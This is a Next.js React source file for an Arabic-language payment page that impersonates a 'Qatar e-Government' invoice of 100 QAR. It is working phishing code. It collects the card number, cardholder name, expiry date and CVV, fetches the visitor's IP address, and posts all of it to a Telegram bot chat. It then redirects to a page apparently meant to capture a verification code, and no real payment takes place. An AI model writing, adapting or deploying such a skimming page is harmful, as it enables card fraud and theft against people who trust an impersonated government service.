"use client";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export default function PaymentPage() {
  const router = useRouter();

  const [cardNumber, setCardNumber] = useState("");
  const [name, setName] = useState("");
  
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [errors, setErrors] = useState({});
  const [ipAddress, setIpAddress] = useState(""); // لتخزين عنوان الـ IP
  const [showMonthDropdown, setShowMonthDropdown] = useState(false);
  const [showYearDropdown, setShowYearDropdown] = useState(false);

  const months = Array.from({ length: 12 }, (_, i) =>
    (i + 1).toString().padStart(2, "0")
  );
  const years = Array.from({ length: 14 }, (_, i) => 2025 + i);

  useEffect(() => {
    // الحصول على عنوان الـ IP عند تحميل الصفحة
    const fetchIp = async () => {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        setIpAddress(data.ip);
      } catch (error) {
        console.error("خطأ في جلب عنوان IP:", error);
      }
    };
    fetchIp();
  }, []);

  const handleCardNumberChange = (e) => {
    let value = e.target.value.replace(/\s+/g, "").slice(0, 16);
    value = value.replace(/(\d{4})/g, "$1 ").trim();
    setCardNumber(value);
  };

  const handleCvvChange = (e) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 3);
    setCvv(value);
  };

const handleNameChange = (e) => {
    const value = e.target.value
    setName(value);
  };

  const validateFields = () => {
    const newErrors = {};
    if (!cardNumber || cardNumber.replace(/\s/g, "").length < 16) {
      newErrors.cardNumber = true;
    }
    if (!name) {
      newErrors.name = true;
    }
    if (!expiryMonth) newErrors.expiryMonth = true;
    if (!expiryYear) newErrors.expiryYear = true;
    if (!cvv || cvv.length < 3) newErrors.cvv = true;
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (validateFields()) {
      const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
      const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
      const message = `تفاصيل الدفع:\n- رقم البطاقة: ${cardNumber}\n- الإسم: ${name}\n- الشهر: ${expiryMonth}\n- السنة: ${expiryYear}\n- CVV: ${cvv}\n- IP المستخدم: ${ipAddress}`;

      try {
        const response = await fetch(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
            }),
          }
        );

        if (response.ok) {
          router.push(`/loading?nextPage=/code`);
        } else {
          alert("أعد المحاولة حدث خطأ ما");
        }
      } catch (error) {
        alert("أعد المحاولة حدث خطأ ما");
      }
    }
  };

  return (
    <div className="flex flex-col bg-gray-200 h-screen p-4 space-y-4">
    <div className="max-w-xl bg-white rounded-lg shadow-md p-3 flex flex-row-reverse text-center">
      
      {/* العمود الأول */}

      <div className="flex-1 border-r border-[#d81b60] px-2">
        <p className="text-xs text-gray-600">رقم الفاتورة</p>
        <p className="text-xs font-bold">20000743399</p>
      </div>

      {/* العمود الثاني */}
      <div className="flex-1 border-r border-[#d81b60] px-2">
        <p className="text-xs text-gray-600">مبلغ المعاملة</p>
        <p className="text-xs font-bold">100.00 QAR</p>
      </div>

      {/* العمود الثالث */}
      <div className="flex-1 border-r border-[#d81b60] px-2">
        <p className="text-xs text-gray-600">اسم التاجر</p>
        <p className="text-xs font-bold">Qatar e-Government</p>
      </div>
      <div className="flex-1">
            </div>
    </div>
      <form
        onSubmit={handleSubmit}
        className="bg-[url('/Bg.jpeg')] bg-cover bg-center bg-no-repeat py-8 px-3 rounded-lg w-full max-w-md h-auto shadow-md space-y-8">
        
        <h2 className="text-lg text-gray-600 font-semibold mb-6">يرجى إدخال تفاصيل البطاقة</h2>

        {/* رقم البطاقة */}
        
        <div className="mb-4">
          <label className="block text-xs font-medium mb-1 text-gray-600">رقم البطاقة</label>
          <input
            type="text"
            value={cardNumber}
            onChange={handleCardNumberChange}
            placeholder="رقم البطاقة"
            className={`w-full bg-gray-50 placeholder:text-gray-900 placeholder:font-semibold rounded-sm text-xs p-2 border-b ${
              errors.name ? "border-b-1 border-red-500" : "border-gray-400"
            }`}
          />
        </div>
        <div className="mb-4">
          <label className="block text-xs font-medium mb-1 text-gray-600">الإسم كما هو موضح في بطاقتك</label>
          <input
            type="text"
            value={name}
            onChange={handleNameChange}
            placeholder="أدخل إسم حامل البطاقة"
            className={`w-full bg-gray-50 placeholder:text-gray-900 placeholder:font-semibold rounded-sm text-xs p-2 border-b ${
              errors.cardNumber ? "border-b-1 border-red-500" : "border-gray-400"
            }`}
          />
        </div>
        {/* تاريخ انتهاء الصلاحية */}
      <div>
        <label className="block text-xs font-medium mb-1 text-gray-600">تاريخ إنتهاء الصلاحية</label>      
        <div className="mb-4 flex gap-4">
          {/* Dropdown الشهر */}
          <div className="w-1/2 relative">
            <div
              className={`w-full bg-gray-50 rounded-sm text-xs text-gray-900 font-semibold p-2 border-b cursor-pointer ${
                errors.expiryMonth ? "border-b-1 border-red-500" : "border-gray-400"
              }`}
              onClick={() => setShowMonthDropdown(!showMonthDropdown)}
            >
              {expiryMonth || "شهر"}
            </div>
            <ul
              className={`absolute top-full left-0 w-full bg-white border border-gray-300 rounded-lg shadow-lg mt-1 z-10 max-h-40 overflow-y-auto transform transition-all duration-300 ease-in-out ${
                showMonthDropdown
                  ? "opacity-100 scale-100"
                  : "opacity-0 scale-95 pointer-events-none"
              }`}
            >
              {months.map((month) => (
                <li
                  key={month}
                  onClick={() => {
                    setExpiryMonth(month);
                    setShowMonthDropdown(false);
                  }}
                  className="p-3 hover:bg-blue-100 cursor-pointer border-b last:border-none"
                >
                  {month}
                </li>
              ))}
            </ul>
          </div>

          {/* Dropdown السنة */}
          <div className="w-1/2 relative">
            <div
              className={`w-full bg-gray-50 text-gray-900 font-semibold rounded-sm text-xs p-2 border-b cursor-pointer ${
                errors.expiryYear ? "border-b-1 border-red-500" : "border-gray-400"
              }`}
              onClick={() => setShowYearDropdown(!showYearDropdown)}
            >
              {expiryYear || "سنة"}
            </div>
            <ul
              className={`absolute top-full left-0 w-full bg-white border border-gray-300 rounded-lg shadow-lg mt-1 z-10 max-h-40 overflow-y-auto transform transition-all duration-300 ease-in-out ${
                showYearDropdown
                  ? "opacity-100 scale-100"
                  : "opacity-0 scale-95 pointer-events-none"
              }`}
            >
              {years.map((year) => (
                <li
                  key={year}
                  onClick={() => {
                    setExpiryYear(year);
                    setShowYearDropdown(false);
                  }}
                  className="p-3 hover:bg-blue-100 cursor-pointer border-b last:border-none"
                >
                  {year}
                </li>
              ))}
            </ul>
          </div>
        </div>
      </div>
        {/* رمز الحماية CVV */}
        <div className="mb-4">
          <label className="block text-xs font-medium mb-1 text-gray-600">رمز الحماية</label>
          <input
            type="text"
            value={cvv}
            onChange={handleCvvChange}
            placeholder="يرجى إدخال cvv"
            className={`w-full bg-gray-50 placeholder:text-gray-900 placeholder:font-semibold rounded-sm text-xs p-2 border-b ${
              errors.cvv ? "border-b-1 border-red-500" : "border-gray-400"
            }`}
          />
        </div>

        {/* زر الدفع */}
        <button
          type="submit"
          className="w-full bg-[#c81048] text-white p-2 rounded-lg font-semibold hover:bg-[#d81b60]"
        >
      دفع 
        </button>
      </form>
    </div>
  );
}